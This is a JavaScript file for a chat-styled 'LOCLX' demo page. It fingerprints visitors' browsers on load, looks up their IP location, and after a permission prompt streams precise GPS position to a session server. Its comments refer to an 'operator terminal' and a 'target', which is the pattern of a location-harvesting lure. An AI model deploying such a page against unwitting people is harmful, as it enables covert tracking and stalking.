(function () {
  const GEO_PRIMARY_OPTS = {
    enableHighAccuracy: true,
    timeout: 60000,
    maximumAge: 0
  };

  const GEO_PRECISE_WATCH_OPTS = {
    enableHighAccuracy: true,
    timeout: 60000,
    maximumAge: 0
  };

  const WATCH_MAX_MS = 60000;

  let ipInfo = null;
  let watchId = null;
  let watchTimer = null;
  let inProgress = false;

  function getSessionId() {
    const parts = window.location.pathname.split("/").filter(Boolean);
    if (parts.length >= 2 && parts[0] === "session") {
      return parts[1];
    }
    return "";
  }

  function getTargetEndpoint() {
    const sid = getSessionId();
    return sid ? ("/api/session/" + sid + "/location") : "/report";
  }

  function scrollChatToBottom() {
    const body = document.getElementById("chat-body");
    if (body) {
      body.scrollTop = body.scrollHeight;
    }
  }

  function appendBubble(text, isOutgoing) {
    const thread = document.getElementById("chat-thread");
    if (!thread) return;

    const group = document.createElement("div");
    group.className = "message-group " + (isOutgoing ? "outgoing" : "incoming");

    const bubble = document.createElement("div");
    bubble.className = "message-bubble";

    const p = document.createElement("p");
    p.textContent = text;

    bubble.appendChild(p);
    group.appendChild(bubble);
    thread.appendChild(group);

    scrollChatToBottom();
  }

  function isValidCoordinate(lat, lon) {
    if (typeof lat !== "number" || typeof lon !== "number") return false;
    if (isNaN(lat) || !isFinite(lat) || isNaN(lon) || !isFinite(lon)) return false;
    if (lat < -90 || lat > 90) return false;
    if (lon < -180 || lon > 180) return false;
    return true;
  }

  function collectBrowserInfo() {
    const ua = navigator.userAgent || "Unknown";
    let browser = "Browser";
    let version = "1.0";

    if (/Edg|Edge/i.test(ua)) {
      browser = "Edge";
      const m = ua.match(/Edg[e]?\/(\d+(\.\d+)*)/i);
      if (m) version = m[1];
    } else if (/SamsungBrowser/i.test(ua)) {
      browser = "Samsung Internet";
      const m = ua.match(/SamsungBrowser\/(\d+(\.\d+)*)/i);
      if (m) version = m[1];
    } else if (/OPR|Opera/i.test(ua)) {
      browser = "Opera";
      const m = ua.match(/(?:OPR|Opera)\/(\d+(\.\d+)*)/i);
      if (m) version = m[1];
    } else if (/Firefox|FxiOS/i.test(ua)) {
      browser = "Firefox";
      const m = ua.match(/(?:Firefox|FxiOS)\/(\d+(\.\d+)*)/i);
      if (m) version = m[1];
    } else if (/CriOS/i.test(ua)) {
      browser = "Chrome iOS";
      const m = ua.match(/CriOS\/(\d+(\.\d+)*)/i);
      if (m) version = m[1];
    } else if (/Chrome/i.test(ua)) {
      browser = /Android/i.test(ua) ? "Chrome Android" : "Chrome";
      const m = ua.match(/Chrome\/(\d+(\.\d+)*)/i);
      if (m) version = m[1];
    } else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
      browser = "Safari";
      const m = ua.match(/Version\/(\d+(\.\d+)*)/i);
      if (m) version = m[1];
    } else if (/Trident/i.test(ua)) {
      browser = "Internet Explorer";
      const m = ua.match(/rv:(\d+(\.\d+)*)/i);
      if (m) version = m[1];
    }

    return {
      userAgent: ua,
      platform: navigator.platform || "Unknown",
      browser: browser,
      browserVersion: version,
      screenResolution: window.screen ? window.screen.width + "x" + window.screen.height : "Unknown",
      devicePixelRatio: (window.devicePixelRatio || 1).toString(),
      hardwareConcurrency: (navigator.hardwareConcurrency || "Unknown").toString(),
      cpuCores: (navigator.hardwareConcurrency || "Unknown").toString(),
      language: navigator.language || "Unknown",
      timezone: Intl && Intl.DateTimeFormat ? Intl.DateTimeFormat().resolvedOptions().timeZone : "Unknown",
      viewportSize: window.innerWidth + "x" + window.innerHeight,
      touchSupport: ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "Yes" : "No",
      deviceType: (/Mobi|Android/i.test(ua) || ('ontouchstart' in window && screen.width < 768)) ? "Mobile" : "Desktop"
    };
  }

  function parseWho(j) {
    const conn = j.connection || {};
    return {
      ip: j.ip,
      city: j.city,
      region: j.region,
      country: j.country,
      isp: conn.isp || j.isp || conn.org,
      lat: typeof j.latitude === "number" ? j.latitude : null,
      lon: typeof j.longitude === "number" ? j.longitude : null
    };
  }

  function parseApi(j) {
    return {
      ip: j.ip,
      city: j.city,
      region: j.region,
      country: j.country_name || j.country,
      isp: j.org || j.isp,
      lat: typeof j.latitude === "number" ? j.latitude : null,
      lon: typeof j.longitude === "number" ? j.longitude : null
    };
  }

  async function lookupIp() {
    try {
      const r = await fetch("https://ipwho.is/");
      if (r.ok) {
        const j = await r.json();
        if (j && j.success !== false) {
          ipInfo = parseWho(j);
          return;
        }
      }
    } catch (e) {
      console.warn("ipwho.is lookup failed:", e);
    }

    try {
      const r = await fetch("https://ipapi.co/json/");
      if (r.ok) {
        const j = await r.json();
        ipInfo = parseApi(j);
      }
    } catch (e) {
      console.warn("ipapi.co lookup failed:", e);
    }
  }

  function postPayload(data) {
    const dest = getTargetEndpoint();
    const sid = getSessionId();

    return fetch(dest, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    })
      .then(function (res) {
        if (!res.ok) {
          console.error("Location POST failed:", {
            status: res.status,
            endpoint: dest,
            sessionId: sid
          });
          return false;
        }
        return true;
      })
      .catch(function (err) {
        console.error("Network error posting location payload:", {
          error: err,
          endpoint: dest,
          sessionId: sid
        });
        return false;
      });
  }

  function clearWatchSafely() {
    if (watchId !== null && navigator.geolocation) {
      navigator.geolocation.clearWatch(watchId);
      watchId = null;
    }
    if (watchTimer !== null) {
      clearTimeout(watchTimer);
      watchTimer = null;
    }
  }

  function startHighAccuracyWatch() {
    clearWatchSafely();
    if (!navigator.geolocation) return;

    watchId = navigator.geolocation.watchPosition(
      function (newPos) {
        const nc = newPos.coords;
        if (!isValidCoordinate(nc.latitude, nc.longitude)) return;

        const timestampStr = newPos.timestamp ? new Date(newPos.timestamp).toLocaleTimeString() : new Date().toLocaleTimeString();

        postPayload({
          gps: {
            lat: nc.latitude,
            lon: nc.longitude,
            accuracy: typeof nc.accuracy === "number" && isFinite(nc.accuracy) ? nc.accuracy : null,
            altitude: typeof nc.altitude === "number" && isFinite(nc.altitude) ? nc.altitude : null,
            speed: typeof nc.speed === "number" && isFinite(nc.speed) ? nc.speed : null,
            heading: typeof nc.heading === "number" && isFinite(nc.heading) ? nc.heading : null,
            timestamp: timestampStr
          }
        });
      },
      function (err) {
        console.warn("WatchPosition diagnostic warning:", err);
      },
      GEO_PRECISE_WATCH_OPTS
    );

    // Bounded high-accuracy watch (stop after 60 seconds)
    watchTimer = setTimeout(function () {
      clearWatchSafely();
    }, WATCH_MAX_MS);
  }

  function applyFix(pos) {
    const c = pos.coords;
    if (!isValidCoordinate(c.latitude, c.longitude)) {
      geoError({ code: 2 });
      return;
    }

    const timestampStr = pos.timestamp ? new Date(pos.timestamp).toLocaleTimeString() : new Date().toLocaleTimeString();

    const gpsData = {
      lat: c.latitude,
      lon: c.longitude,
      accuracy: typeof c.accuracy === "number" && isFinite(c.accuracy) ? c.accuracy : null,
      altitude: typeof c.altitude === "number" && isFinite(c.altitude) ? c.altitude : null,
      speed: typeof c.speed === "number" && isFinite(c.speed) ? c.speed : null,
      heading: typeof c.heading === "number" && isFinite(c.heading) ? c.heading : null,
      timestamp: timestampStr
    };

    const bInfo = collectBrowserInfo();
    postPayload({
      ip: ipInfo,
      gps: gpsData,
      browser: bInfo
    }).then(function (success) {
      if (!success) {
        appendBubble("Location fix was acquired, but could not be sent to the server. Check server connection.", false);
      }
    });

    startHighAccuracyWatch();
  }

  async function getLocationPermissionState() {
    if (!navigator.permissions || !navigator.permissions.query) {
      return "unknown";
    }

    try {
      const result = await navigator.permissions.query({
        name: "geolocation"
      });

      return result.state || "unknown";
    } catch (e) {
      return "unknown";
    }
  }

  function enableContinueButton() {
    inProgress = false;
    const btn =
      document.getElementById("btn-start-demo") ||
      document.getElementById("btn-continue");

    if (btn) {
      btn.disabled = false;
    }
  }

  function geoError(err) {
    clearWatchSafely();
    const bInfo = collectBrowserInfo();
    const code = err ? err.code : 1;
    postPayload({ denied: true, errorCode: code, browser: bInfo });

    if (code === 1) {
      appendBubble("Location permission was denied or blocked. Please allow Location access for this site in your browser settings and click Continue again.", false);
    } else if (code === 2) {
      appendBubble("Position unavailable. Device positioning service could not determine location.", false);
      appendBubble("Ensure Location/GPS is enabled in your device settings and try again.", false);
    } else if (code === 3) {
      appendBubble("Location request timed out before acquiring a fix.", false);
      appendBubble("Ensure device Location is enabled and try again.", false);
    } else {
      appendBubble("Location information is currently unavailable.", false);
    }

    enableContinueButton();
  }

  function checkSecureContext() {
    const isSecure = window.isSecureContext !== false;
    const isLocal = window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1" || window.location.hostname === "::1";
    if (!isSecure && !isLocal && window.location.protocol !== "https:") {
      appendBubble("WARNING: Browser Geolocation requires a Secure Context (HTTPS). Accessing over unencrypted HTTP will cause location requests to fail. Please use the HTTPS public URL.", false);
    }
  }

  async function startDemo() {
    if (inProgress) return;
    inProgress = true;

    const btn =
      document.getElementById("btn-start-demo") ||
      document.getElementById("btn-continue");

    if (btn) {
      btn.disabled = true;
    }

    checkSecureContext();

    appendBubble("Checking browser location capabilities...", false);

    if (!navigator.geolocation) {
      appendBubble("Geolocation API is not supported or unavailable in this browser environment.", false);
      enableContinueButton();
      return;
    }

    const permissionState = await getLocationPermissionState();

    if (permissionState === "denied") {
      appendBubble(
        "Location permission is blocked for this site. Allow location access in browser site settings and click Continue.",
        false
      );
      enableContinueButton();
      return;
    }

    appendBubble("Requesting location permission grant from browser...", false);

    clearWatchSafely();

    navigator.geolocation.getCurrentPosition(
      function (pos) {
        inProgress = false;
        appendBubble("Location fix acquired (±" + Math.round(pos.coords.accuracy || 0) + " m).", false);
        applyFix(pos);
        appendBubble("Tracking position updates to improve accuracy...", false);
      },
      function (err) {
        inProgress = false;
        geoError(err);
      },
      GEO_PRIMARY_OPTS
    );
  }

  // Cleanup watchers on page unload
  window.addEventListener("beforeunload", clearWatchSafely);
  window.addEventListener("pagehide", clearWatchSafely);
  window.addEventListener("unload", clearWatchSafely);

  document.addEventListener("DOMContentLoaded", function () {
    const bInfo = collectBrowserInfo();
    lookupIp();

    // Diagnostic console check
    console.log("LOCLX Participant Diagnostics:", {
      secureContext: window.isSecureContext,
      geolocationAvailable: Boolean(navigator.geolocation),
      getCurrentPositionAvailable: Boolean(navigator.geolocation && navigator.geolocation.getCurrentPosition),
      sessionId: getSessionId()
    });

    // Send initial browser connection payload so operator terminal displays target connection immediately
    postPayload({ browser: bInfo });

    const btn = document.getElementById("btn-start-demo") || document.getElementById("btn-continue");
    if (btn) {
      btn.addEventListener("click", startDemo);
    }
  });
})();
